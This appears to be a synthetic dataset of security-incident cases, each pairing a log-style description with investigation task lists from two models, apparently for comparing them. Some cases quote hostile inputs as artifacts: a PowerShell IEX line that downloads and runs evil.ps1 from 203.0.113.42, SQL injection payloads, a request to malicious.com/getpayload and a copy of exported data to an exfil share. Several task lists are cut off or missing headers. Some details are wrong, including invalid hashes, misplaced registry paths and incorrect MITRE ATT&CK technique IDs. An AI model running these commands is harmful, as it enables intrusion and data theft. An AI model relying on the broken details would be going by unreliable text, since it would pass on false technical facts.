case_title: A privilege escalation attempt has been identified using local administrator privileges on a Windows Server 2019 system.
case_description: Sysmon Event ID 1: process creation of *malicious.exe* (hash: 3F4C34E6F89...), Security Event ID 4672: user *bob* used administrative privilege for process creation; PowerShell script executed “whoami /groups” revealing group membership; Net localgroup administrators shows addition of *bob*; Scheduled task “ElevateTask” created via *schtasks.exe* to run at system startup; RDP session Event ID 4624 authenticated as user *bob* from IP 203.0.113.5; Windows Security Log Event ID 4657: registry modification of HKLM\SYSTEM\CurrentControlSet\Services\winlogon setting userinit.exe to *malicious.exe* (hash: 22B8C...), Network traffic to internal IP 192.168.20.200:443 from *cmd.exe* detected; Temporary file C:\Temp\psexec.exe (hash: A1B2C3D4E5F6) created; DLL “bad.dll” (hash: E5F6G7H8I9J0) loaded into lsass.exe (process ID 1408); Credential dumping activity via *mimikatz.exe* targeting LSASS; New user “adminimp” created with domain administrator rights; Memory dump attempted with *memdump.exe* (file: 2026-03-10_1210.dmp).
model_a_tasks:
Task #1  
Title: Correlate event logs from Sysmon, Security, and Application  
Description: Collect all relevant event logs including Sysmon ID 1, Security IDs 4672, 4624, 4657 and any other logs between the timestamps of *malicious.exe* execution and the scheduled task creation. Build a chronological timeline to identify the sequence of attacker actions and any pre‑attack reconnaissance.  

Task #2  
Title: Verify *malicious.exe* hash and execution details  
Description: Locate the instance(s) of *malicious.exe* on the server, compute its SHA‑256 hash, compare it to the known hash 3F4C34E6F89..., and confirm file path, creation time, and parent process. Document whether the file originates from an unrelated process or is a deliberate drop.  

Task #3  
Title: Audit local administrators group for unauthorized additions  
Description: Run `net localgroup administrators` to list current members, identify when *bob* was added, and cross‑reference event logs for group modification events. Verify whether the addition was performed by an existing administrator or an attacker and check for any other anomalous account changes.  

Task #4  
Title: Investigate the *ElevateTask* scheduled task  
Description: Query the scheduled task via `schtasks /query /tn ElevateTask /xml` to retrieve detailed properties, owner information, and triggers. Validate that it launches *malicious.exe* at system startup and check for any other scheduled tasks that might provide persistence.  

Task #5  
Title: Examine the Userinit registry key for persistence  
Description: Export HKLM\SYSTEM\CurrentControlSet\Services\winlogon\Userinit and compare its current value to the default system value. Verify the presence of *malicious.exe* in the key and the timestamp of modification, and determine if the key was tampered with post‑startup or during the event.  

Task #6  
Title: Correlate RDP login of *bob* with the attacker IP  
Description: Review Security Event 4624 for user *bob* from IP 203.0.113.5 to confirm the authentication method, session ID, and login time. Check for any other remote logons by *bob* or other accounts that might indicate lateral movement or credential reuse.  

Task #7  
Title: Validate PowerShell group enumeration for privilege escalation evidence  
Description: Retrieve the PowerShell script executed by *bob*, examine its content, and confirm that the `whoami /groups` output was captured. Determine if the script was used to identify additional group memberships or to hide the presence of the attacker.  

Task #8  
Title: Capture and analyze network traffic to 192.168.20.200:443  
Description: Use a packet capture tool or firewall logs to inspect the traffic sent by `cmd.exe` to the internal IP and port. Identify the protocol, content, and any credentials or commands transmitted; this may reveal a back‑door or exfiltration channel.  

Task #9  
Title: Determine the use of C:\Temp\psexec.exe for lateral movement  
Description: Verify the existence, hash, and parent process of `psexec.exe`. Investigate its command line arguments to see if it was used to spawn additional processes, such as `lsass.exe` or other remote execution tools.  

Task #10  
Title: Investigate *bad.dll* injection into `lsass.exe`  
Description: Use Sysinternals ProcMon or Process Explorer to confirm that *bad.dll* is loaded into `lsass.exe` and determine the injection method (DLL hijacking, injection API). Check if *bad.dll* contains code that interacts with LSASS for credential dumping.  

Task #11  
Title: Confirm mimikatz usage targeting LSASS for credential dumping  
Description: Search logs for `mimikatz.exe` execution, inspect the command lines used, and cross‑reference with LSASS memory dumps. Determine whether valid domain credentials were extracted and whether they were used to create new accounts or compromise other systems.  

Task #12  
Title: Validate creation and privileges of the *adminimp* account  
Description: Query Active Directory for user *adminimp*, confirm the creation timestamp, group memberships, and whether it was granted Domain Administrator rights. Investigate the parent user or process responsible for its creation.  

Task #13  
Title: Analyze the memory dump attempt with *memdump.exe*  
Description: Locate the file *2026‑03‑10_1210.dmp*, verify its hash, and use forensic memory analysis (e.g., Volatility) to search for encryption keys, cached credentials, or signs of LSASS memory extraction. Correlate the time of creation with other attacker actions.  

Task #14  
Title: Search for additional persistence mechanisms  
Description: Enumerate all startup locations: Run, RunOnce, Windows Service definitions, WMI event filters, Group Policy Preferences, and startup scripts. Verify none contain references to *malicious.exe*, LSASS hijack, or other evidence of persistence beyond those already identified.  

Task #15  
Title: Preserve forensic evidence and document chain of custody  
Description: Create a forensic disk image using a write‑blocker, copy essential system logs, registry hives, memory dumps, and any captured network traffic. Hash all evidence, document acquisition steps, and ensure a clear chain of custody for potential legal or compliance actions.
model_b_tasks:
**Task #1**  
Title: Verify alert validity and isolate impacted system  
Description: Correlate the received case header with the forensic workstation ID and network segment to confirm the affected host. Validate that the alert originated from legitimate monitoring tools (e.g., sysmon, Windows Security logs). Immediately place the Windows Server 2019 identified in infrastructure monitoring alerts into quarantine or deny-all network state to prevent further lateral movement while investigation is underway.

---

**Task #2**  
Title: Identify and locate malicious executables by file name and hash  
Description: Search the affected system’s file system for files named *malicious.exe*, *bad.dll*, *memdump.exe*, *psexec.exe*, and other suspicious artifacts. Verify each file’s hash against the provided values (e.g., 3F4C34E6F89…, 22B8C…, A1B2C3D4E5F6, E5F6G7H8I9J0) using tools such as certutil or PowerShell Get-FileHash. Record file paths, timestamps, and permissions for audit trail.

---

**Task #3**  
Title: Validate malicious file integrity and provenance  
Description: Cross‑reference the located malicious files against known malware signatures from reputable AV vendors and threat intelligence feeds. Open each file in a sandboxed environment (e.g., FireEye, Cuckoo) to confirm malicious behavior. Compare the file’s sizes, timestamps, and parent directories to baseline system images to detect tampering or stealth placement.

---

**Task #4**  
Title: Collect Sysmon process creation logs for malicious activities  
Description: Query the sysmon event log for Event ID 1 relating to *malicious.exe*, *psexec.exe*, *mimikatz.exe*, *memdump.exe*, *bad.dll*, and other relevant binaries. Export logs filtered by file name, command line, and source path. Note parent process IDs (PIDs) and command line arguments to reconstruct the attack chain.

---

**Task #5**  
Title: Reconstruct process hierarchy and launch points  
Description: Using the Sysmon logs from Task 4, map the parent-child relationships for every malicious process. Identify whether *malicious.exe* was launched directly by PowerShell, cmd.exe, or a scheduled task (ElevateTask). Document the authentication context (user, domain) for each launch, paying particular attention to privilege escalation instances (Event ID 4672).

---

**Task #6**  
Title: Inspect scheduled tasks for persistence mechanisms  
Description: Enumerate all scheduled tasks on the server (`schtasks /Query /V /FO LIST`). Locate “ElevateTask” and any other suspicious tasks pointing to malicious binaries or custom scripts. Capture full task definitions, triggers, actions, run levels, and user contexts. Temporarily disable identified malicious tasks (`schtasks /Change /TN ElevateTask /Disable`) and schedule removal for post‑remediation cleanup.

---

**Task #7**  
Title: Audit registry modifications targeting userinit persistence  
Description: Review Sysmon Event ID 4657 and Windows Security Log Event ID 4657 for HKLM\SYSTEM\CurrentControlSet\Services\winlogon\Userinit changes. Verify that the registry value now points to *malicious.exe* (hash: 22B8C…). Export the original Userinit registry value and compare against a clean baseline. Document timestamps, modifying user, and any associated file creation events for *malicious.exe*.

---

**Task #8**  
Title: Analyze DLL injection into lsass for credential dumping evidence  
Description: Search Sysmon Event ID 10 for process injection incidents where *bad.dll* was loaded into lsass.exe (PID 1408). Verify the integrity of *bad.dll* and lsass.exe via Get-FileHash. Use Process Explorer or Autoruns to confirm *bad.dll* residency in lsass and gather a list of loaded modules. Flag lsass memory as a high‑value target for forensic extraction.

---

**Task #9**  
Title: Investigate credential dumping activity and harvested data

case_title: Suspicious external IP attempts exploitation of a vulnerable web application via SQL injection and CVE‑2024‑5678
case_description: Firewall inbound connection 2024‑03‑07 13:45:22 from 203.0.113.42 to port 80 with user‑agent “sqlmap/1.0”; IDS alert Snort rule 200198 “SQL injection attempt – potential exploitation of CVE‑2024‑5678”; Web server log 10.5.0.1 - - [07/Mar/2024:13:45:23 +0000] “GET /login?username=admin&password=admin' OR '1'='1 HTTP/1.1” 200 1234 bytes; Process creation on Linux host: “sqlsh” started by root with arguments “-s 1.2.3.4 -p 4444”; Zeek log shows port 4444 scanned from 203.0.113.42; CrowdStrike AV flagged /tmp/evil.sh as malicious; Windows Event ID 4688 shows “powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.42/evil.ps1')” executed by SYSTEM; Registry key HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SQLLauncher added with value “C:\\Windows\\system32\\sqlsh.exe”; SMB authentication log shows 302 failed NTLM attempts for account administrator from 203.0.113.42.
model_a_tasks:
Task #1  
Title: Correlate Firewall Inbound Event with IDS Alert  
Description: Review the firewall log entry detailing the inbound connection from 203.0.113.42 to port 80 at 13:45:22 and cross‑check the corresponding Snort rule 200198 alert. Confirm that the same packet flow appears in both systems and rule the source IP or port as invalid if the data diverges.  

Task #2  
Title: Verify Successful or Failed SQL Injection Attempt  
Description: Parse the web server log line for the request `GET /login?username=admin&password=admin' OR '1'='1` and check the HTTP status code and response size. A 200 status with content suggests the query succeeded; any 400/500 indicates a blocked attempt.  

Task #3  
Title: Identify Indicator of Exploit for CVE‑2024‑5678  
Description: Search the application error logs and system logs for any references to CVE‑2024‑5678 or similar stack traces. Check for the presence of known exploit files or payloads (e.g., “sqlmap_payload”) in the webroot or temporary directories.  

Task #4  
Title: Investigate “sqlsh” Process Creation on Linux Host  
Description: Use host syslog, audit logs, and process accounting to confirm the creation of the `sqlsh` binary by root. Verify the binary’s source (file path, hash) and its command line arguments (`-s 1.2.3.4 -p 4444`).  

Task #5  
Title: Validate Zeek Port Scan Detection on Port 4444  
Description: Inspect Zeek logs for connections from 203.0.113.42 to port 4444 on the Linux host. Correlate with the `sqlsh` process to determine whether the port scan was a reconnaissance step or an infected service listening on 4444.  

Task #6  
Title: Analyze CrowdStrike‑Flagged /tmp/evil.sh Script  
Description: Pull the script from the host’s file system, calculate its hash, and run it through a sandbox or static analysis tool to discover its payload, exfiltration logic, or command and control routines.  

Task #7  
Title: Review Windows PowerShell Execution Event  
Description: Parse Event ID 4688 for the command `powershell.exe -c IEX (New‑Object Net.WebClient).DownloadString('http://203.0.113.42/evil.ps1')`. Retrieve `evil.ps1`, perform static analysis, and check if it establishes persistence, exfiltrates data, or spawns additional malware.  

Task #8  
Title: Confirm Persistence via Registry Run Key  
Description: Verify the `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SQLLauncher` entry points to `C:\Windows\system32\sqlsh.exe`. Confirm whether this binary was copied from the Linux host or another source and whether it remains after a reboot.  

Task #9  
Title: Enumerate SMB Authentication Failures for Brute‑Force Detection  
Description: Aggregate the 302 NTLM failures from the SMB log for account `administrator` by IP 203.0.113.42. Determine if these attempts lead to a successful authentication or if password spraying was attempted on other accounts.  

Task #10  
Title: Detect Lateral Movement between Linux and Windows Systems  
Description: Correlate Windows and Linux logs for subsequent activity after the initial exploitation (e.g., file shares, remote shell activation, credential dumping). Look for evidence of credential theft or use of the `sqlsh` binary on the Windows host.  

Task #11  
Title: Assess Data Exfiltration Traffic to 203.0.113.42  
Description: Review network flow records and IDS alerts to identify outbound connections to the attacker IP, especially on unusual ports (e.g., 4444, 80, 443). Extract payload sizes and compare them to typical business traffic to detect anomalous volume.  

Task #12  
Title: Verify Patch Status for CVE‑2024‑5678 on Affected Systems  
Description: Check the installed version of the vulnerable web application or database on the Linux host. Confirm whether a vendor patch or mitigation has been applied; if not, plan an immediate remediation.  

Task #13  
Title: Conduct Host‑Based Forensic Imaging and Evidence Collection  
Description: Create a disk image of the Linux and Windows hosts for further analysis. Preserve volatile memory dumps, process snapshots, and registry hives to enable a deeper investigation into potential backdoors.  

Task #14  
Title: Update Firewall Rules to Block Malicious Traffic  
Description: Add deny rules for IP 203.0.113.42 on all relevant inbound/outbound ports (80, 4444, 443). Ensure the rules are tested to avoid disruption to legitimate services and confirm they are persisted in the firewall configuration.  

Task #15  
Title: Compile Investigation Findings and Recommendations  
Description: Summarize the evidence of exploitation, persistence, and potential data exfiltration. Document containment steps taken, patch status, and incident severity. Provide actionable recommendations for future detection and prevention.
model_b_tasks:

**Task #2**

Look for unusual payload markers, database error strings, or altered responses beyond the recorded HTTP 200 status. Capture the full HTTP request/response pair for archiving and forensic reference.  

---

**Task #3**  
Title: Detect Remote Code Execution via CVE‑2024‑5678  
Description: Verify whether the injection attempt resulted in arbitrary code execution on the vulnerable web application server. Search system and application logs for signs of shell activity, file creation, or outbound network connections initiated from the web server around the exploitation timestamp. If RCE was achieved, collect evidence of executed commands, created binaries, or established reverse shells.

**Task #4**

Compare the binary against threat intelligence feeds to determine if it is a known malicious tool or a custom payload.

Verify integrity with SHA256 checksums. Preserve all logs, binaries, scripts (including `sqlsh` and `/tmp/evil.sh`), and any other exfiltration artifacts for offline analysis.  

---

**Task #6**  
Title: Investigate Persistence on Linux Host  
Description: Search for cron jobs, systemd units, or init scripts referencing `sqlsh` or other suspicious binaries. Inspect `/etc/rc*.d`, `/etc/crontab`, `crontab -l`, `systemctl list-unit-files`, and user shell profiles for persistence mechanisms. Flag any discovered startup scripts or services that enable repeated execution of malicious code.  

---

**Task #7**  
Title: Expand Zeek Scan Analysis  
Description: Review Zeek logs for port 4444 scans originating from 203.0.113.42. Identify all internal hosts that were probed and assess whether any followed‑on exploitation attempts occurred. Map the scanning surface to prioritize targeted hardening (e.g., disabling unused services on scanned ports).  

---

**Task #8**  
Title: Examine CrowdStrike Detection of /tmp/evil.sh  
Description: Retrieve the detection signature, threat ID, and hash for `/tmp/evil.sh` from CrowdStrike TAC. Download the same PowerShell script that was executed on Windows (`evil.ps1`) via `powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.42/evil.ps1')`. Analyze both scripts for malicious payloads, C2 beacon code, or lateral movement facilitation.  

---

**Task #9**  
Title: Correlate Windows PowerShell Beacon Activity  
Description: Filter Windows Security event log for Event ID 4688 with `powershell.exe`. Extract the full command line used to download and execute `evil.ps1` from 203.0.113.42. If the script is no longer present, reconstruct its contents from network captures or other infected hosts. Determine whether the script establishes a C2 channel, downloads further payloads, or modifies system configuration.  

---

**Task #10**  
Title: Ascertain Persistence via Windows Run Key  
Description: Verify the entry HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SQLLauncher pointing to `C:\Windows\system32\sqlsh.exe`. Confirm whether `sqlsh.exe` resides in a legitimate location or in a backdoored/custom location. Trace the binary's origin—was it copied from the Linux host, downloaded via PowerShell, or supplied by the CVE‑2024‑5678 exploitation? Plan removal of both the registry key and the associated binary after documenting its presence in forensic artifacts.  

---

**Task #11**  
Title: Investigate SMB Authentication Bypass Attempt  
Description: Examine Security log for Event IDs relating to SMB authentication (4608, 4624, 4625). Identify any successful logons to the domain with the `administrator` account or other privileged accounts following the 302 failed NTLM attempts from 203.0.113.42. If successful authentication is observed, conduct a lateral movement audit on the corresponding workstation/server and enforce password reset and MFA for compromised accounts.  

---

**Task #12**  
Title: Domain‑Wide Search for sqlsh Artifacts  
Description: Query all endpoints for presence of the `sqlsh` binary, its hash, or related registry keys. Use centralized EDR search capabilities or endpoint inventory tools to locate any opportunistic persistence on other hosts. Document findings, prioritize remediation on hosts with suspicious artifacts, and evaluate whether lateral movement likely occurred.  

---

**Task #13**  
Title: Patch and Update Vulnerable Web Application  
Description: Assess patch status of the web application for CVE‑2024‑5678 on Linux host 10.5.0.1 and any other exposed applications. If unpatched, schedule immediate deployment of vendor KB patch. Perform post‑patch verification by attempting the known SQL injection payload against the fixed server and confirming no exploit is possible.  

---

**Task #14**  
Title: Block Offending External IP 203.0.113.42  
Description: Update perimeter firewall rules to deny all inbound and outbound traffic to/from 203.0.113.42 across all ports and protocols. If the IP is part of a broader malicious infrastructure, incorporate it into blocklists maintained by the SIEM or threat feed integration. Validate block effectiveness by generating controlled test traffic and reviewing firewall logs.  

---

**Task #15**  
Title: Perform Windows Endpoint Forensics  
Description: On the Windows machine that launched the PowerShell beacon, acquire volatile memory and full disk image using tools like FTK Imager or EnCase. Examine registry Run keys, scheduled tasks, services, and startup folders for persistence. Scrutinize Sysmon logs for file creations, binary executions, scheduled tasks, or unusual network connections. Extract any malicious scripts, binaries, or configuration changes for static analysis.  

---

**Task #16**  
Title: Conduct MITRE ATT&CK Mapping  
Description: Map identified behaviors to ATT&CK techniques: T1190 (Exploit Public‑Facing Application), T1073 (Credentials IN Files), T1059.001 (Command‑Line Interface), T1059.003 (Windows PowerShell), T1053.005 (Scheduled Task), T1071.001 (Web Protocols), T1041 (Exfiltration Over C2 Channel), etc. Document mapping to guide containment priorities and improve future detection rules.  

---

**Task #17**  
Title: Review Credential Management Practices  
Description: Audit domain‑wide password policies and usage for privileged accounts, especially `administrator`. Investigate any possibility of credential dumping or reuse with tools like Mimikatz or LSASS dumper signatures. Enforce mandatory password reset for affected accounts, enforce MFA for privileged access, and review privileged account management controls.  

---

**Task #18**  
Title: Compile Investigation Findings  
Description: Summarize all evidence collected—logs, forensic images, malware hashes, MITRE ATT&CK mappings, timelines, and chain‑of‑custody records. Prepare a detailed narrative covering the initial intrusion attempt, exploitation of CVE‑2024‑5678, lateral movement via sqlsh, persistence mechanisms on Linux and Windows hosts, and potential data exfiltration indicators.  

---

**Task #19**  
Title: Recommend Containment Actions  
Description: Based on findings, propose immediate containment steps: isolate compromised hosts, remove persistence mechanisms (Run keys, scheduled tasks), patch CVE‑2024‑5678, block malicious IP, reset passwords and enforce MFA, revoke any compromised certificates or credentials, and enhance inspection of RDP/SMB traffic. Assign owners and estimate effort for each action.  

---

**Task #20**  
Title: Plan Post‑Incident Recovery and Monitoring Improvements  
Description: Outline recovery steps: restore affected services from clean backups, verify system integrity, re‑configure firewalls and WAF rules to block SQL injection patterns, and deploy host‑based IPS signatures targeting CVE‑2024‑5678 exploitation. Recommend ongoing monitoring dashboards for indicators of compromise: sqlmap user‑agent traffic, Zeek port 4444 scans, CrowdStrike detections, Windows Run key additions, SMB brute‑force attempts. Schedule a post‑incident tabletop exercise to validate response effectiveness and update playbooks accordingly.

case_title: Exploitation attempt via SQL injection on the company’s admin portal.
case_description:
- WAF alert ID 7410 triggered at 2024-03-08T13:22:05Z for an HTTP POST to /admin/login containing the payload “admin' OR '1'='1”.  
- Source IP 203.0.113.45, Destination IP 10.20.30.40 targeting HTTPS port 443.  
- IDS signature 2245 flagged “SQL Injection” and triggered correlation rule “Potential Exploit Attempt.”  
- Network capture shows the HTTP request followed by a 500 Internal Server Error, with no session cookie set.  
- System log on 10.20.30.40 records at 2024‑03‑08T13:22:07Z a warning: “Login authentication failed: SQL error.”  
- No new processes were spawned, no system registry or file modifications recorded, and no privilege escalations noted.  
- A file named login.php in /var/www/html was modified at 13:21:57Z; its SHA256 hash recorded as 9e9c49c2f3e5b1234abcd5678ef0123456789abcdef1234567890abcdef1234567.  
- Internal audit logs show a warning on use of raw input in SQL queries but no successful login events.  
- Subsequent traffic includes a suspicious GET request to /admin/user?name=admin' UNION ALL SELECT 1,2,3-- at 13:23:12Z from the same source IP.
model_a_tasks:
Task #1  
Title: Correlate WAF and IDS alerts  
Description: Pull the corresponding WAF event (ID 7410) and IDS signature (2245) from the SOAR platform to confirm that they refer to the same traffic episode. Verify that timestamps, source/destination IPs, and request paths all match to rule out duplicate or unrelated alerts.  

Task #2  
Title: Extract and analyze the raw HTTP POST payload  
Description: Decode the packet capture segment containing the /admin/login POST request at 13:22:05Z. Inspect the form fields, verify that the payload “admin' OR '1'='1” was transmitted, and confirm that no additional obfuscated arguments were present.  

Task #3  
Title: Confirm that the HTTP response was an error and no session cookie was set  
Description: Review the HTTP response headers and body to verify that the web server returned a 500 Internal Server Error. Check the Set‑Cookie header to confirm a session cookie was not issued, indicating authentication failure.  

Task #4  
Title: Verify the integrity of the modified login.php file

case_title: Suspicious enumeration of Active Directory resources discovered on internal host 10.1.15.48
case_description: Source IP 10.1.15.48 attempted enumeration of domain controller 10.0.0.3 on ports 445, 139, 389 at 2026-03-08 10:33 UTC; Sysmon event ID 1, PID 0x1A2C, process cmd.exe /c "net view /all" and PowerShell.exe -Command "Import-Module ActiveDirectory; Get-ADUser -Filter * | Export-Csv C:\Temp\ADUsers.csv" captured; Windows Security Log event ID 4624, Security ID: S-1-5-21-...-500, logon type 10, authentication package Kerberos, user testuser; Get-ADComputer enumeration resulting in 75 objects exported to C:\Temp\ADComputers.csv; SMB file share discovery: NetShareEnum on DC returned 47 shares; DNS query logs show lookup requests for internal subdomains: *._ldap._tcp., *._dns._tcp.; Nmap scan logs indicate source 10.1.15.48 scanning ports 445, 389, 3268 on target 10.0.0.3 with 100 responses in <30 seconds; Antivirus engine flagged PowerShell.exe with hash 3F27C9... as suspicious enumeration activity; Netstat and system monitoring logs show additional LDAP queries and SMB connections to multiple internal services; Data exfiltration attempt: attempted copy of exported CSV files to external share \\exfil.local\share.

case_title: Unusual privilege escalation activity observed: scheduled tasks and registry changes on Windows host WIN-AX12.
case_description:
- Windows Security event 4624 (Logon ID 0x00000000) – User ID ATTACKER_PRV logged on using logon type 3 (Network).  
- Windows Security event 4672 – User ATTACKER_PRV granted elevated privileges (System) on WIN-AX12.  
- Sysmon event 1 – Process creation: `powershell.exe` executed with arguments `-NoProfile -ExecutionPolicy Bypass -Command "Add-LocalGroupMember -Group 'Administrators' -Member 'ATTACKER_PRV'"`.  
- Sysmon event 1 – Process creation: `cmd.exe` executed with arguments `/c net user EAUSER /add`.  
- File artifact: `C:\Temp\MalExec.exe` created, SHA‑256: `e3b0c44298fc1c149afbf4c8996fb924`.  
- File artifact: `C:\Temp\MalExec.exe` copied to `C:\Windows\Temp\malTask.exe` at 2024‑03‑01 14:55:00.  
- Registry modification: HKLM\SYSTEM\CurrentControlSet\Control\Windows\CurrentVersion\Shell modified to `C:\Windows\Temp\malTask.exe`.  
- Scheduled task created: `malTask.exe` set to run at system startup with elevated rights.  
- Event log ID 4697 – Service `BadService` installed by ATTACKER_PRV with SYSTEM privileges.  
- Network artifact: Outbound HTTP request to `http://malicious.com/getpayload` originating from `MalExec.exe`.  
- Log file `C:\Windows\Logs\Audit.log` contains entry: `Attempt to add user ATTACKER_PRV to Administrators group`.
model_a_tasks:
Task #1
Title: Determine the legitimacy and privileges of ATTACKER_PRV account  
Description: Query Active Directory or local SAM to confirm if ATTACKER_PRV is a known or compromised user. Cross‑reference logon ID 0x00000000 from event 4624 with account creation dates, last logon times, and group memberships. Verify if the account has been granted SYSTEM rights and whether policy violations (e.g., 4672) have been logged.  

Task #2
Title: Verify the integrity of MalExec.exe  
Description: Compare the SHA‑256 hash `e3b0c44298fc1c149afbf4c8996fb924` against the file located at `C:\Temp\MalExec.exe`. Run the file through a static malware scanner (e.g., YARA, VirusTotal) and capture a snapshot for dynamic analysis to confirm malicious behavior.  

Task #3
Title: Examine scheduled task malTask.exe for persistence  
Description: Inspect the properties of the scheduled task created on WIN‑AX12: owner, triggers, actions, run‑as account, and run‑level. Confirm that `malTask.exe` is configured to start at system startup with SYSTEM privileges. Check task history for execution times.  

Task #4
Title: Investigate the BadService service installation  
Description: Retrieve the binary location and path of the installed service BadService. Review its startup type, permissions, and related event logs (4697). Verify whether the service binary resides in legitimate locations or if it points to a malicious executable.  

Task #5
Title: Audit registry modification to HKLM\SYSTEM…\Shell  
Description: Compare the current value of the Shell registry key to the stock Windows default (`explorer.exe`). Identify when the change to `C:\Windows\Temp\malTask.exe` occurred and correlate with timestamps from event logs and file creation.  

Task #6
Title: Verify PowerShell and cmd command history  
Description: Extract the command lines from Sysmon event 1: the PowerShell command adding ATTACKER_PRV to Administrators and the cmd command creating user EAUSER. Check PowerShell transcripting logs for additional elevated operations run by ATTACKER_PRV.  

Task #7
Title: Inspect network traffic for malicious payload download  
Description: Grab the outbound HTTP request to `http://malicious.com/getpayload` captured from MalExec.exe. Capture any associated traffic, log the response payload, and perform a content analysis (e.g., SHA‑256 hash, YARA scan) to determine the nature of the payload.  

Task #8
Title: Review Windows Audit.log for anomalies  
Description: Parse `C:\Windows\Logs\Audit.log` for entries related to local group modifications, user creation, and privilege escalation. Look for repeated or duplicate attempts to add ATTACKER_PRV to Administrators or any indications of compromised credentials.  

Task #9
Title: Check for other persistence mechanisms on the host  
Description: Search for additional scheduled tasks, startup folder items, autoruns entries, or registry run keys that may provide the attacker with persistence beyond malTask.exe. Use Sysinternals Autoruns or WMI queries to catalogue potential footholds.  

Task #10
Title: Validate the local administrators group membership  
Description: Enumerate current members of the Administrators group using `net localgroup Administrators`. Inspect the audit trail to confirm whether ATTACKER_PRV was added legitimately or via privilege escalation.  

Task #11
Title: Correlate all findings with event ID 4672  
Description: Combine data from the 4672 event indicating ATTACKER_PRV was granted System privileges with other evidence (scheduled task, service install, registry change). Confirm that the privileges were granted in a legitimate context or as a result of malicious elevation.  

Task #12
Title: Document chain of custody and evidence preservation  
Description: Record timestamps, log source, file paths, and all actions taken during the investigation. Take secure forensic images of the system if deeper analysis is required, ensuring integrity for potential incident response or legal proceedings.
model_b_tasks:
Task #1  
Title: Collect host forensic baseline  
Description: Gather baseline metadata from WIN-AX12, including OS version, system manufacturer, firmware versions, domain membership, applied patches, installed software list, network configuration, and currently active interfaces. This provides contextual reference for subsequent investigations and assists in identifying deviations triggered by the privilege escalation.

Task #2  
Title: Retrieve suspicious event logs  
Description: Query Windows Security logs for event IDs 4624 (logon), 4672 (privilege escalation), and 4697 (service installation) on WIN-AX12 within the past 48 hours. Pull Sysmon event ID 1 entries for process creation, file creation, and registry modification. Export these logs to SOAR for correlation and timeline reconstruction.

Task #3  
Title: Enumerate current processes and command lines  
Description: Capture a live snapshot of processes running on WIN-AX12, including command line arguments, parent processes, and user accounts. Cross‑reference with Sysmon process creation events to confirm execution chain and identify any additional malicious payloads launched during the activity window.

Task #4  
Title: Inventory scheduled tasks for persistence  
Description: Query the Windows Task Scheduler for all user‑defined and system‑defined tasks, filtering for those set to run at startup or login with elevated (SYSTEM) privileges. Identify malTask.exe and any other recently created or modified tasks, capturing execution triggers, start times, and assigned users.

Task #5  
Title: Examine registry persistence key  
Description: Retrieve the current and historical values of HKLM\SYSTEM\CurrentControlSet\Control\Windows\CurrentVersion\Shell. Document the modification timestamp, user context, previous value, and new value pointing to C:\Windows\Temp\malTask.exe. Verify the existence, permissions, and integrity of the referenced binary.

Task #6  
Title: Detect newly added privileged accounts  
Description: Enumerate domain and local accounts on WIN-AX12, focusing on ATTACKER_PRV and EAUSER. Check group memberships, particularly Administrators, Domain Admins, and Local System administrators. Record creation times, source IPs, and authentication methods to assess potential lateral reach.

Task #7  
Title: Analyze MalExec.exe binary  
Description: Compute the SHA‑256 hash of C:\Temp\MalExec.exe and query threat intelligence feeds (VirusTotal, HybridAnalysis) for prior detections. If benign or unknown, forward the executable to a sandbox environment configured to emulate persistence hooks and collect dropped files, registry changes, and outbound connections.

Task #8  
Title: Validate installation of BadService  
Description: Query the Service Control Manager for BadService, documenting binary path, startup type, dependencies, and account under which it runs. Verify its persistence by checking whether it restarts after system reboot and whether it hides from standard service enumeration utilities. Confirm SYSTEM privileges via process inspection.

Task #9  
Title: Investigate outbound network activity  
Description: Capture and analyze traffic originating from WIN-AX12 during the escalation window. Identify connections made by MalExec.exe and malTask.exe to external IPs, including http://malicious.com/getpayload. Record destination IPs, ports, protocols, session durations, and any HTTP payload contents for malicious activity confirmation.

Task #10  
Title: Cross‑asset correlation for lateral movement  
Description: Search the SIEM for any other hosts where ATTACKER_PRV or EAUSER logged on via network (Logon type 3) around the same timeframe. Correlate these logons with suspicious scheduled tasks, service installations, or execution chains. Build a comprehensive timeline of attacker activity across the network.

Task #11  
Title: Perform baseline integrity check  
Description: Run file integrity monitoring or host‑based intrusion detection tools against critical system directories (Windows, System32, Program Files, Sysvol). Compare current hashsets against known good baselines to identify injected binaries, altered system files, or unexpected modifications that may indicate deeper compromise.

Task #12  
Title: Automated containment playbook execution  
Description: Trigger a SOAR containment playbook targeting WIN-AX12. The playbook should stop and delete the malTask.exe scheduled task, remove the malicious registry key, terminate any rogue processes (MalExec.exe, malTask.exe, BadService), and quarantine the host if supported. Archive recent logs and forensic snapshots before containerization.

Task #13  
Title: Threat intelligence lookup for malicious domain  
Description: Look up http://malicious.com (Subdivision: HTTP) in internal and external threat intel feeds. Add identified malicious domain to the global block list. Subscribe to updates for the domain/IP to quickly react to future connections from the same threat actor. Additionally, assess whether any other domains were contacted by the malicious binaries.

case_title: Unexpected modification of critical service configuration file detected on Linux host
case_description: Artifact: auditd log entry ID 197 – open/write on /etc/systemd/system/httpd.service by root, timestamp 2026-03-09T13:27:01Z. Observation: SHA256 of httpd.service changed from 6b3f5c8a2f... to e2d1fa3b4c... within 30 seconds. Artifact: syslog dmesg entry – chmod 0644 /etc/systemd/system/httpd.service executed by PID 5423 (sh) as root at 2026-03-09T13:26:55Z. Observation: mtime updated to 2026-03-09T13:26:54Z; ctime – 2026-03-09T13:27:02Z; no corresponding backup or service restart recorded. Artifact: OSSEC alert “FI Configuration Change” for /etc/systemd/system/httpd.service, severity 3. Observation: No backup file exists in /var/backups prior to modification. Artifact: Sysdig trace shows /usr/bin/systemctl reload httpd.service executed by root at 2026-03-09T13:28:10Z, unusual immediately after modification. Observation: No scheduled cron job or configuration management change logged at modification time.
model_a_tasks:
Task #1  
Title: Validate the integrity of the modified httpd.service file  
Description: Compute the current SHA256 hash of `/etc/systemd/system/httpd.service` and compare it with the changed digest `e2d1fa3b4c`. Review the file’s content against a known baseline (e.g., a signed Git snapshot) to detect unauthorized directives such as `ExecStartPre` or `ExecStartPost`. Verify that the file permissions remain 0644 and that the owner is still root.

---

Task #2  
Title: Trace the root shell (PID 5423) that performed the modification  
Description: Extract the command line of PID 5423 (`/proc/5423/cmdline`) and its parent PID chain (`/proc/5423/ppid`). Identify the script or binary that executed the `chmod` and write operations. Inspect environment variables and any arguments passed to the shell to uncover potential hidden or malicious payloads.

---
